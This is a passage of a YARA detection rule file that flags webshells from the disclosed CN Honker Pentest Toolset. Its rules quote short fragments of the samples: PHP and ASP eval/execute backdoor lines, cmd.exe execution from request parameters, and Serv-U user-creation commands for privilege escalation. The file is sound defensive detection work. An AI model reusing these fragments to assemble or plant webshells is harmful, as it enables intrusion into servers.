   meta:
      description = "Webshell from CN Honker Pentest Toolset - file offlibrary.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:09:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "';$i=$g->query(\"SELECT SUBSTRING_INDEX(CURRENT_USER, '@', 1) AS User, SUBSTRING" ascii
      $s12 = "if(jushRoot){var script=document.createElement('script');script.src=jushRoot+'ju" ascii
   condition: 
      filesize < 1005KB and all of them
} 

rule CN_Honker_Webshell_cfm_xl_RID30D5 : CHINA DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file xl.cfm"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:56:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<input name=\"DESTINATION\" value=\"" ascii
      $s1 = "<CFFILE ACTION=\"Write\" FILE=\"#Form.path#\" OUTPUT=\"#Form.cmd#\">" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x433c and filesize < 13KB and all of them
} 

rule CN_Honker_Webshell_PHP_linux_RID31D3 : CHINA DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file linux.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:39:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<form name=form1 action=exploit.php method=post>" fullword ascii
      $s1 = "<title>Changing CHMOD Permissions Exploit " fullword ascii
   condition: 
      uint16 ( 0 ) == 0x696c and filesize < 6KB and all of them
} 

rule CN_Honker_Webshell_Interception3389_get_RID35C6 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file get.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:27:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "userip = Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\")" fullword ascii
      $s1 = "file.writeline  szTime + \" HostName:\" + szhostname + \" IP:\" + userip+\":\"+n" ascii
      $s3 = "set file=fs.OpenTextFile(server.MapPath(\"WinlogonHack.txt\"),8,True)" fullword ascii
   condition: 
      filesize < 3KB and all of them
} 

rule CN_Honker_Webshell_nc_1_RID2FBD : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file 1.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:10:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 " ascii
      $s2 = "<%if session(\"pw\")<>\"go\" then %>" fullword ascii
   condition: 
      filesize < 11KB and all of them
} 

rule CN_Honker_Webshell_PHP_BlackSky_RID32B7 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php6.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:17:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "eval(gzinflate(base64_decode('" ascii
      $s1 = "B1ac7Sky-->" fullword ascii
   condition: 
      filesize < 641KB and all of them
} 

rule CN_Honker_Webshell_ASP_asp3_RID3116 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file asp3.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:07:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if shellpath=\"\" then shellpath = \"cmd.exe\"" fullword ascii
      $s2 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s3\", Tru" ascii
   condition: 
      filesize < 444KB and all of them
} 

rule CN_Honker_Webshell_ASPX_sniff_RID320D : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file sniff.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:48:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));" fullword ascii
      $s2 = "if (!logIt && my_s_smtp && (dport == 25 || sport == 25))" fullword ascii
   condition: 
      filesize < 91KB and all of them
} 

rule CN_Honker_Webshell_udf_udf_RID3139 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file udf.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:13:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<?php // Source  My : Meiam  " fullword ascii
      $s2 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii
   condition: 
      filesize < 430KB and all of them
} 

rule CN_Honker_Webshell_JSP_jsp_RID30F5 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jsp.html"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:02:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<input name=f size=30 value=shell.jsp>" fullword ascii
      $s2 = "<font color=red>www.i0day.com  By:" fullword ascii
   condition: 
      filesize < 3KB and all of them
} 

rule CN_Honker_Webshell_T00ls_Lpk_Sethc_v4_mail_RID36D6 : CHINA DEMO T1015 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file mail.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 17:12:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1015, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if (!$this->smtp_putcmd(\"AUTH LOGIN\", base64_encode($this->user)))" fullword ascii
      $s2 = "$this->smtp_debug(\"> \".$cmd.\"\\n\");" fullword ascii
   condition: 
      filesize < 39KB and all of them
} 

rule CN_Honker_Webshell_phpwebbackup_RID3358 : CHINA DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file phpwebbackup.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:43:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php // Code By isosky www.nbst.org" fullword ascii
      $s2 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii
   condition: 
      uint16 ( 0 ) == 0x3f3c and filesize < 67KB and all of them
} 

rule CN_Honker_Webshell_dz_phpcms_phpbb_RID348F : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file dz_phpcms_phpbb.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:35:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if($pwd == md5(md5($password).$salt))" fullword ascii
      $s2 = "function test_1($password)" fullword ascii
      $s3 = ":\".$pwd.\"\\n---------------------------------\\n\";exit;" fullword ascii
      $s4 = ":user=\".$user.\"\\n\";echo \"pwd=\".$pwd.\"\\n\";echo \"salt=\".$salt.\"\\n\";" fullword ascii
   condition: 
      filesize < 22KB and all of them
} 

rule CN_Honker_Webshell_picloaked_1_RID3298 : CHINA DEMO T1036 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file 1.gif"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:11:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1036, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php eval($_POST[" ascii
      $s1 = ";<%execute(request(" ascii
      $s3 = "GIF89a" fullword ascii
   condition: 
      filesize < 6KB and 2 of them
} 

rule CN_Honker_Webshell_assembly_RID31BC : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file assembly.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:35:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "response.write oScriptlhn.exec(\"cmd.exe /c\" & request(\"c\")).stdout.readall" fullword ascii
   condition: 
      filesize < 1KB and all of them
} 

rule CN_Honker_Webshell_PHP_php8_RID3123 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php8.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:09:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<a href=\"http://hi.baidu.com/ca3tie1/home\" target=\"_blank\">Ca3tie1's Blog</a" ascii
      $s1 = "function startfile($path = 'dodo.zip')" fullword ascii
      $s3 = "<form name=\"myform\" method=\"post\" action=\"\">" fullword ascii
      $s5 = "$_REQUEST[zipname] = \"dodozip.zip\"; " fullword ascii
   condition: 
      filesize < 25KB and 2 of them
} 

rule CN_Honker_Webshell_Tuoku_script_xx_RID34B7 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file xx.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:42:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$mysql.=\"insert into `$table`($keys) values($vals);\\r\\n\";" fullword ascii
      $s2 = "$mysql_link=@mysql_connect($mysql_servername , $mysql_username , $mysql_password" ascii
      $s16 = "mysql_query(\"SET NAMES gbk\");" fullword ascii
   condition: 
      filesize < 2KB and all of them
} 

rule CN_Honker_Webshell_JSPMSSQL_RID30D9 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file JSPMSSQL.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:57:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<form action=\"?action=operator&cmd=execute\"" fullword ascii
      $s2 = "String sql = request.getParameter(\"sqlcmd\");" fullword ascii
   condition: 
      filesize < 35KB and all of them
} 

rule CN_Honker_Webshell_Injection_Transit_jmPost_RID381F : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jmPost.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 18:07:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "response.write  PostData(JMUrl,JmStr,JmCok,JmRef)" fullword ascii
      $s2 = "JmdcwName=request(\"jmdcw\")" fullword ascii
   condition: 
      filesize < 9KB and all of them
} 

rule CN_Honker_Webshell_ASP_web_asp_RID3280 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file web.asp.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:07:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<FORM method=post target=_blank>ShellUrl: <INPUT " fullword ascii
      $s1 = "\" >[Copy code]</a> 4ngr7&nbsp; &nbsp;</td>" fullword ascii
   condition: 
      filesize < 13KB and all of them
} 

rule CN_Honker_Webshell_wshell_asp_RID328E : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file wshell-asp.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:10:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "file1.Write(\"<%response.clear:execute request(\\\"root\\\"):response.End%>\");" fullword ascii
      $s2 = "hello word !  " fullword ascii
      $s3 = "root.asp " fullword ascii
   condition: 
      filesize < 5KB and all of them
} 

rule CN_Honker_Webshell_ASP_asp404_RID317B : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file asp404.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:24:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "temp1 = Len(folderspec) - Len(server.MapPath(\"./\")) -1" fullword ascii
      $s1 = "<form name=\"form1\" method=\"post\" action=\"<%= url%>?action=chklogin\">" fullword ascii
      $s2 = "<td>&nbsp;<a href=\"<%=tempurl+f1.name%>\" target=\"_blank\"><%=f1.name%></a></t" ascii
   condition: 
      filesize < 113KB and all of them
} 

rule CN_Honker_Webshell_Serv_U_asp_RID3253 : CHINA DEMO T1087 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file Serv-U asp.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:00:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1087, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" &" ascii
      $s2 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user goldsun lov" ascii
      $s3 = "deldomain = \"-DELETEDOMAIN\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \" PortNo=\"" ascii
   condition: 
      filesize < 30KB and 2 of them
} 

rule CN_Honker_Webshell_cfm_list_RID31AD : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file list.cfm"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:32:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<TD><a href=\"javascript:ShowFile('#mydirectory.name#')\">#mydirectory.name#</a>" ascii
      $s2 = "<TD>#mydirectory.size#</TD>" fullword ascii
   condition: 
      filesize < 10KB and all of them
} 

rule CN_Honker_Webshell_PHP_php2_RID311D : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php2.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:08:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii
      $s2 = "<?php // Black" fullword ascii
   condition: 
      filesize < 12KB and all of them
} 

rule CN_Honker_Webshell_Tuoku_script_oracle_RID363D : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file oracle.jsp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:47:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword ascii
      $s2 = "String user=\"oracle_admin\";" fullword ascii
      $s3 = "String sql=\"SELECT 1,2,3,4,5,6,7,8,9,10 from user_info\";" fullword ascii
   condition: 
      filesize < 7KB and all of them
} 

rule CN_Honker_Webshell_ASPX_aspx4_RID31E7 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file aspx4.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:42:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "File.Delete(cdir.FullName + \"\\\\test\");" fullword ascii
      $s5 = "start<asp:TextBox ID=\"Fport_TextBox\" runat=\"server\" Text=\"c:\\\" Width=\"60" ascii
      $s6 = "<div>Code By <a href =\"http://www.hkmjj.com\">Www.hkmjj.Com</a></div>" fullword ascii
   condition: 
      filesize < 11KB and all of them
} 

rule CN_Honker_Webshell_ASPX_aspx_RID31B3 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file aspx.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:33:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin" ascii
      $s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
      $s2 = "td.Text=\"<a href=\\\"javascript:Bin_PostBack('urJG','\"+dt.Rows[j][\"ProcessID" ascii
      $s3 = "vyX.Text+=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(rootkey)+" ascii
   condition: 
      filesize < 353KB and 2 of them
} 

rule CN_Honker_Webshell_su7_x_9_x_RID31C1 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file su7.x-9.x.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:36:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "returns=httpopen(\"LoginID=\"&user&\"&FullName=&Password=\"&pass&\"&ComboPasswor" ascii
      $s1 = "returns=httpopen(\"\",\"POST\",\"http://127.0.0.1:\"&port&\"/Admin/XML/User.xml?" ascii
   condition: 
      filesize < 59KB and all of them
} 

rule CN_Honker_Webshell_cfmShell_RID318A : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file cfmShell.cfm"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:26:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<cfexecute name=\"C:\\Winnt\\System32\\cmd.exe\"" fullword ascii
      $s4 = "<cfif FileExists(\"#GetTempDirectory()#foobar.txt\") is \"Yes\">" fullword ascii
   condition: 
      filesize < 4KB and all of them
} 

rule CN_Honker_Webshell_ASP_asp4_RID3117 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file asp4.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:07:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
      $s6 = "Response.Cookies(Cookie_Login) = sPwd" fullword ascii
      $s8 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
   condition: 
      filesize < 150KB and all of them
} 

rule CN_Honker_Webshell_Serv_U_2_admin_by_lake2_RID3711 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file Serv-U 2 admin by lake2.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 17:22:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/lake2\", True" fullword ascii
      $s2 = "response.write \"FTP user lake  pass admin123 :)<br><BR>\"" fullword ascii
      $s8 = "<p>Serv-U Local Get SYSTEM Shell with ASP" fullword ascii
      $s9 = "\"-HomeDir=c:\\\\\" & vbcrlf & \"-LoginMesFile=\" & vbcrlf & \"-Disable=0\" & vb" ascii
   condition: 
      filesize < 17KB and 2 of them
} 

rule CN_Honker_Webshell_PHP_php3_RID311E : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php3.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:08:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "} elseif(@is_resource($f = @popen($cfe,\"r\"))) {" fullword ascii
      $s2 = "cf('/tmp/.bc',$back_connect);" fullword ascii
   condition: 
      filesize < 8KB and all of them
} 

rule CN_Honker_Webshell_Serv_U_by_Goldsun_RID3525 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file Serv-U_by_Goldsun.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:00:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/goldsun/upadmin/s2\", True," ascii
      $s2 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" &" ascii
      $s3 = "127.0.0.1:<%=port%>," fullword ascii
      $s4 = "GName=\"http://\" & request.servervariables(\"server_name\")&\":\"&request.serve" ascii
   condition: 
      filesize < 30KB and 2 of them
} 

rule CN_Honker_Webshell_PHP_php10_RID314C : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php10.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:16:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "dumpTable($N,$M,$Hc=false){if($_POST[\"format\"]!=\"sql\"){echo\"\\xef\\xbb\\xbf" ascii
      $s2 = "';if(DB==\"\"||!$od){echo\"<a href='\".h(ME).\"sql='\".bold(isset($_GET[\"sql\"]" ascii
   condition: 
      filesize < 600KB and all of them
} 

rule CN_Honker_Webshell_Serv_U_servu_RID3344 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file servu.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:40:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "fputs ($conn_id, \"SITE EXEC \".$dir.\"cmd.exe /c \".$cmd.\"\\r\\n\");" fullword ascii
      $s1 = "function ftpcmd($ftpport,$user,$password,$dir,$cmd){" fullword ascii
   condition: 
      filesize < 41KB and all of them
} 

rule CN_Honker_Webshell_portRecall_jsp2_RID3452 : CHINA DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jsp2.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:25:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "final String remoteIP =request.getParameter(\"remoteIP\");" fullword ascii
      $s4 = "final String localIP = request.getParameter(\"localIP\");" fullword ascii
      $s20 = "final String localPort = \"3390\";//request.getParameter(\"localPort\");" fullword ascii
   condition: 
      filesize < 23KB and all of them
} 

rule CN_Honker_Webshell_ASPX_aspx2_RID31E5 : CHINA DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file aspx2.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:42:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if (password.Equals(this.txtPass.Text))" fullword ascii
      $s1 = "<head runat=\"server\">" fullword ascii
      $s2 = ":<asp:TextBox runat=\"server\" ID=\"txtPass\" Width=\"400px\"></asp:TextBox>" fullword ascii
      $s3 = "this.lblthispath.Text = Server.MapPath(Request.ServerVariables[\"PATH_INFO\"]);" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 9KB and all of them
} 

